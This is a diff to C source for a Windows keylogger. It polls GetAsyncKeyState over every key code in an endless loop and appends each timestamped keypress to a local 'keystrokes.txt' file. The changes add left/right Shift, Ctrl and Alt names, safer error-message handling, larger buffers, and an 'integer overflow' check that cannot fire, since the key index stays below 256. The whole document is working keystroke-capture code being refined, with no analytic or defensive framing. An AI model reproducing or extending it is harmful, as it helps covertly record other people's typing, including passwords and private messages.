@@ -5,30 +5,29 @@
 #include <stdbool.h>
 #include <errno.h>
 #include <string.h>
+#include <limits.h> // For INT_MAX
 
 #define LOG_FILE "keystrokes.txt"
 #define TIMESTAMP_FORMAT "%Y-%m-%d %H:%M:%S"
 #define MAX_TIMESTAMP_LENGTH 20
 #define NUM_KEYS 256
-#define MAX_KEY_NAME_LENGTH 32 // Define a maximum length for key names
+#define MAX_KEY_NAME_LENGTH 64 // Increased for longer key names
+#define MAX_ERROR_MESSAGE_LENGTH 256
 
 // Function to get the current timestamp
 bool get_timestamp(char *timestamp, size_t timestamp_size) {
     time_t rawtime;
     struct tm timeinfo;
-    errno_t err;
 
     time(&rawtime);
-    err = localtime_s(&timeinfo, &rawtime);
-
-    if (err != 0) {
-        fprintf(stderr, "Error: localtime_s failed with error code %d.\n", err);
+    if (localtime_s(&timeinfo, &rawtime) != 0) {
+        fprintf(stderr, "Error: localtime_s failed.\n");
         timestamp[0] = '\0';
         return false;
     }
 
     if (strftime(timestamp, timestamp_size, TIMESTAMP_FORMAT, &timeinfo) == 0) {
-        fprintf(stderr, "Error: Timestamp buffer too small.\n");
+        fprintf(stderr, "Error: Timestamp buffer too small or format error.\n");
         timestamp[0] = '\0';
         return false;
     }
@@ -46,8 +45,14 @@ const char* get_key_name(int key) {
         case VK_TAB: return "\t";
         case VK_BACK: return "[BACKSPACE]";
         case VK_SHIFT: return "[SHIFT]";
+        case VK_LSHIFT: return "[LSHIFT]"; // Distinguish left and right shift
+        case VK_RSHIFT: return "[RSHIFT]";
         case VK_CONTROL: return "[CTRL]";
+        case VK_LCONTROL: return "[LCTRL]"; // Distinguish left and right control
+        case VK_RCONTROL: return "[RCTRL]";
         case VK_MENU: return "[ALT]";
+        case VK_LMENU: return "[LALT]"; // Distinguish left and right alt
+        case VK_RMENU: return "[RALT]";
         case VK_CAPITAL: return "[CAPSLOCK]";
         case VK_ESCAPE: return "[ESCAPE]";
         default:
@@ -71,7 +76,12 @@ bool log_keystroke(int key) {
     FILE *file;
     errno_t err = fopen_s(&file, LOG_FILE, "a");
     if (err != 0 || file == NULL) {
-        fprintf(stderr, "Error opening %s: %s\n", LOG_FILE, strerror(err));
+        char error_message[MAX_ERROR_MESSAGE_LENGTH];
+        if (strerror_s(error_message, sizeof(error_message), err) == 0) {
+            fprintf(stderr, "Error opening %s: %s\n", LOG_FILE, error_message);
+        } else {
+            fprintf(stderr, "Error opening %s: Unknown error.\n", LOG_FILE);
+        }
         return false;
     }
 
@@ -83,9 +93,13 @@ bool log_keystroke(int key) {
 
     fprintf(file, "[%s] %s\n", timestamp, get_key_name(key));
 
-
     if (fclose(file) == EOF) {
-        perror("Error closing keystrokes.txt");
+        char error_message[MAX_ERROR_MESSAGE_LENGTH];
+        if (strerror_s(error_message, sizeof(error_message), errno) == 0) {
+            fprintf(stderr, "Error closing %s: %s\n", LOG_FILE, error_message);
+        } else {
+            fprintf(stderr, "Error closing %s: Unknown error.\n", LOG_FILE);
+        }
         return false;
     }
     return true;
@@ -100,6 +114,12 @@ int main() {
 
     while (1) {
         for (key = 1; key < NUM_KEYS; key++) {
+            // Check for integer overflow
+            if (key > INT_MAX - 1) {
+                fprintf(stderr, "Integer overflow detected. Exiting loop.\n");
+                return 1;
+            }
+
             if (GetAsyncKeyState(key) & 0x8000) {
                 if (!key_pressed[key]) {
                     if (!log_keystroke(key)) {
